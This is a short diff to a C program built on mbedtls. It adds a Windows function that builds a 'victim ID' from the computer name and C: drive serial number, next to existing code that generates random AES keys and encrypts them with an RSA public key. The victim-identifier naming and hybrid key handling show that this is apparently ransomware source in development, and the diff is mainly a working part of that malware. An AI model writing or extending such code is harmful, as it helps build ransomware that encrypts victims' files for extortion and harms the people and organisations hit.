@@ -5,6 +5,7 @@
 #include <stdint.h>
 #include <string.h>
 #include <stdbool.h>
+#include <windows.h>
 
 #include "mbedtls/aes.h"
 #include "mbedtls/ctr_drbg.h"
@@ -67,6 +68,36 @@ static void random_bytes(unsigned char *buf, size_t len) {
         handle_error("Random generation failed");
 }
 
+/* Generate victim ID using computer name and volume serial number */
+
+static int generate_victim_id(char *victim_id, size_t id_size) {
+    char comp_name[256];
+    DWORD name_len = sizeof(comp_name);
+    DWORD serial_num = 0;
+    
+    // check if buffer is big enough
+    if (!victim_id || id_size < 64) {
+        fprintf(stderr, "Buffer too small\n");
+        return -1;
+    }
+    
+    // get computer name
+    if (!GetComputerNameA(comp_name, &name_len)) {
+        // if it fails use "PC" as default
+        strcpy(comp_name, "PC");
+    }
+    
+    // get the C drive serial number
+    if (!GetVolumeInformationA("C:\\", NULL, 0, &serial_num, NULL, NULL, NULL, 0)) {
+        fprintf(stderr, "Could not get drive serial number");
+        return -1;
+    }
+    
+    // combine them "comp_name-hex_serial_num"
+    snprintf(victim_id, id_size, "%s-%08X", comp_name, serial_num);
+    
+    return 0;
+}
 /* Encrypt AES key with public RSA key */
 static void save_encrypted_key_rsa(const unsigned char *key, size_t key_len, const char *pubkey_file, const char *out_file) {
     mbedtls_pk_context pk;
